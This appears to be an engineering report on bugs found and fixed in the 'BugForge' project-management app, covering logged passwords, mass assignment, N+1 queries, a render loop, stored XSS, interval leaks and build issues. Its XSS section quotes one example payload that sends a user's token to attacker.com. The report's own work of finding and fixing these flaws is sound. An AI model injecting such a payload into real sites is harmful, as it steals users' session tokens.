# BugForge Engineering Report

## 1. Executive Summary

This report documents the investigation, diagnosis, and remediation of defects found in the BugForge project-management application. Six issues were identified spanning critical security vulnerabilities, a severe frontend performance defect, and operational reliability gaps. All six were resolved, verified with automated tests, and the project builds cleanly with passing lint and type checks.

---

## 2. Issues Found

### Issue 1 — Plaintext Password in Application Logs

| Field        | Detail                                        |
| ------------ | --------------------------------------------- |
| **Severity** | Critical                                      |
| **Category** | Security                                      |
| **File**     | `apps/api/src/controllers/auth-controller.ts` |

**Root Cause**: The `login` handler called `req.log.info({ email, password }, ...)` on every login attempt, writing the raw password to the structured Pino log output.

**Impact**: Any log aggregation system (Datadog, CloudWatch, Elastic, stdout in CI) would store plaintext credentials. This violates OWASP ASVS, GDPR, and SOC 2 requirements and is exploitable if logs are ever breached or accessible to internal staff.

---

### Issue 2 — Unvalidated Input in Task Update (Mass Assignment)

| Field        | Detail                                        |
| ------------ | --------------------------------------------- |
| **Severity** | High                                          |
| **Category** | Security / Correctness                        |
| **File**     | `apps/api/src/controllers/task-controller.ts` |

**Root Cause**: `updateTask` cast `req.body` directly to `Record<string, unknown>` and passed it to `findByIdAndUpdate`. Zod validation was intentionally bypassed.

**Impact**: An authenticated user could overwrite any document field — including immutable fields like `project`, `createdBy`, and `_id` — or supply values outside the allowed enum sets (e.g. status `"hacked"`). MongoDB's `$runValidators` only enforces Mongoose-level constraints (not Zod schemas), so this is not a sufficient safeguard.

---

### Issue 3 — N+1 Database Queries in Dashboard API

| Field        | Detail                                             |
| ------------ | -------------------------------------------------- |
| **Severity** | Medium                                             |
| **Category** | Performance                                        |
| **File**     | `apps/api/src/controllers/dashboard-controller.ts` |

**Root Cause**: The dashboard endpoint issued one `countDocuments` query per project to compute `completedTasks`, using `Promise.all` over a per-project loop. A user with 50 active projects would trigger 50 separate MongoDB round-trips on every dashboard load.

**Impact**: High latency for users with many projects; scales linearly with the number of projects. Unnecessary load on MongoDB.

---

### Issue 4 — Infinite Re-Render Loop in Dashboard Component

| Field        | Detail                                        |
| ------------ | --------------------------------------------- |
| **Severity** | Critical                                      |
| **Category** | Defect / Performance                          |
| **File**     | `apps/web/app/(dashboard)/dashboard/page.tsx` |

**Root Cause**: The component declared `const [renderVersion, setRenderVersion] = useState(0)` and used `useEffect(() => { setRenderVersion(renderVersion + 1) }, [renderVersion])`. Each state update re-triggers the effect, creating an unbounded render loop.

**Impact**: The dashboard page immediately causes 100% CPU utilisation in the browser tab, freezing the UI and making the application completely unusable. This is a blocking production defect.

---

### Issue 5 — Stored Cross-Site Scripting (XSS) via Project Description

| Field        | Detail                                       |
| ------------ | -------------------------------------------- |
| **Severity** | High                                         |
| **Category** | Security                                     |
| **File**     | `apps/web/app/(dashboard)/projects/page.tsx` |

**Root Cause**: Project descriptions were rendered with `dangerouslySetInnerHTML={{ __html: project.description }}`. The description field accepts arbitrary text input from the user but was rendered as raw HTML.

**Impact**: Any project member can store a malicious script in a project description (e.g., `<img src=x onerror="fetch('/api/v1/auth/me').then(r=>r.json()).then(d=>fetch('https://attacker.com/?t='+d.token))">`) that executes in every other user's browser when they visit the Projects page. This can steal session tokens and is a classic stored XSS.

---

### Issue 6 — Notification Polling Interval Never Cleared (Memory Leak)

| Field        | Detail                              |
| ------------ | ----------------------------------- |
| **Severity** | Low                                 |
| **Category** | Operational Reliability             |
| **File**     | `apps/web/components/app-shell.tsx` |

**Root Cause**: `setInterval(pollNotifications, 5000)` was called in a `useEffect` with no cleanup function. The interval ID was discarded.

**Impact**: If `AppShell` mounts and unmounts (e.g., during client-side navigation or hot reload in dev), each mount creates a new interval. Over time this accumulates stale intervals sending redundant API calls and holding references to stale closures, causing memory and network leaks.

---

### Bonus — Silent Token Refresh Missing (Operational Readiness)

| Field        | Detail                     |
| ------------ | -------------------------- |
| **Severity** | Medium                     |
| **Category** | Operational Readiness / UX |
| **File**     | `apps/web/services/api.ts` |

**Root Cause**: Access tokens have a 15-minute TTL. When they expired, all API calls returned 401 and the frontend threw errors without attempting to renew the session using the stored refresh token.

**Impact**: Users are effectively logged out silently every 15 minutes, losing unsaved work and needing to manually log in again. In a real product, this would produce continuous user complaints.

---

### Bonus — Duplicate Mongoose Index on User Email

| Field        | Detail                        |
| ------------ | ----------------------------- |
| **Severity** | Low                           |
| **Category** | Code Cleanliness              |
| **File**     | `apps/api/src/models/user.ts` |

**Root Cause**: The `email` field was declared with `{ unique: true }` inside the schema definition and also with `userSchema.index({ email: 1 }, { unique: true })` below. Mongoose logs a warning at every startup.

**Impact**: Startup noise; potential confusion about which index definition is authoritative.

---

### Bonus — Build Script Fails on Windows (Operational Readiness)

| Field        | Detail                                             |
| ------------ | -------------------------------------------------- |
| **Severity** | Medium                                             |
| **Category** | Operational Readiness / CI                         |
| **File**     | `apps/web/package.json`, `apps/web/next.config.ts` |

**Root Cause 1**: The `lint` script used Unix-style inline env var assignment (`ESLINT_USE_FLAT_CONFIG=false eslint ...`) which does not work in Windows `cmd` or PowerShell.  
**Root Cause 2**: `next build` with `output: 'standalone'` uses symlinks for tracing. Windows requires Developer Mode or admin privileges for symlink creation, causing `EPERM` errors.

**Impact**: CI on Windows or any developer on Windows could not lint or build the frontend.

---

## 3. Fixes Made

| #   | File                      | Fix                                                                                              |
| --- | ------------------------- | ------------------------------------------------------------------------------------------------ |
| 1   | `auth-controller.ts`      | Remove `password` field from log call                                                            |
| 2   | `task-controller.ts`      | Parse body with `taskSchema.partial().parse(req.body)`                                           |
| 3   | `dashboard-controller.ts` | Single `countDocuments({ project: { $in: projectIds }, status: 'done' })` call via `Promise.all` |
| 4   | `dashboard/page.tsx`      | Remove `renderVersion` state and self-triggering `useEffect`                                     |
| 5   | `projects/page.tsx`       | Replace `dangerouslySetInnerHTML` with `{project.description}` text rendering                    |
| 6   | `app-shell.tsx`           | Store interval ID, return `clearInterval` from `useEffect`                                       |
| 7   | `services/api.ts`         | Add 401 interceptor with queued refresh-token flow and redirect to `/login` on failure           |
| 8   | `user.ts`                 | Remove redundant `userSchema.index({ email: 1 }, { unique: true })`                              |
| 9   | `web/package.json`        | Wrap lint script with `npx cross-env` for Windows compatibility                                  |
| 10  | `next.config.ts`          | Disable `standalone` output on `win32` to avoid `EPERM` symlink errors                           |

### Alternatives Considered

- **Issue 2**: Could also use a whitelist `pick()` approach instead of `partial()`. Chose `partial()` because it preserves all schema-defined fields (including future ones) without needing to be updated.
- **Issue 3**: Could use `$facet` aggregation. Chose a single `countDocuments` with `$in` as simpler, easier to read, and sufficient for the use case.
- **Issue 7**: Could use a library like `axios` with interceptors. Chose to implement natively to keep zero new production dependencies.

---

## 4. Tests and Verification

### Automated Tests Added

**File**: `apps/api/tests/controllers.test.ts`

Three integration tests were added covering the two highest-risk backend fixes:

1. `updateTask — successfully updates valid fields and filters out illegal fields`: Verifies that a valid `title`/`status` update goes through, and that an attempt to overwrite `project` is silently stripped by Zod.
2. `updateTask — rejects invalid enum values for status`: Verifies that `status: "invalid_status"` throws a ZodError, which the `errorHandler` converts to a 422.
3. `dashboard — retrieves statistics and correct completed task counts`: Verifies that the single aggregation query returns an accurate `completedTasks` count.

### Test Results

```
Test Files  2 passed (2)
Tests       5 passed (5)
```

### Verification Commands

```bash
pnpm test        # all 5 tests pass
pnpm lint        # 0 warnings, 0 errors (both api and web)
pnpm typecheck   # no type errors
pnpm build       # api builds (tsc), web builds (next build, 11 pages)
```

---

## 5. Remaining Risks and Recommended Follow-Up

| Risk                                                  | Priority | Recommended Action                                                                         |
| ----------------------------------------------------- | -------- | ------------------------------------------------------------------------------------------ |
| No rate limiting on `/auth/login` or `/auth/register` | High     | Add `express-rate-limit` middleware to auth routes to prevent brute force                  |
| CORS allows any origin (`callback(null, true)`)       | High     | Restrict to a known allowlist of origins in production                                     |
| Refresh token not rotated on use                      | Medium   | Rotate the refresh token on each `/auth/refresh` call to prevent token replay attacks      |
| No pagination on task/comment list endpoints          | Medium   | Add cursor or page-based pagination before going live at scale                             |
| No health check for MongoDB in `docker-compose`       | Medium   | Add `depends_on` with `condition: service_healthy` and a Mongo `healthcheck` definition    |
| `staleTime: Infinity` on dashboard query              | Low      | Dashboard data will never auto-refresh without a page reload; consider `staleTime: 30_000` |
| Swagger `apis: []` — no routes documented             | Low      | Add JSDoc comments and populate `apis` glob to generate useful API documentation           |
| Frontend has no error boundary                        | Low      | Add a React `ErrorBoundary` component to prevent blank screens on unhandled errors         |
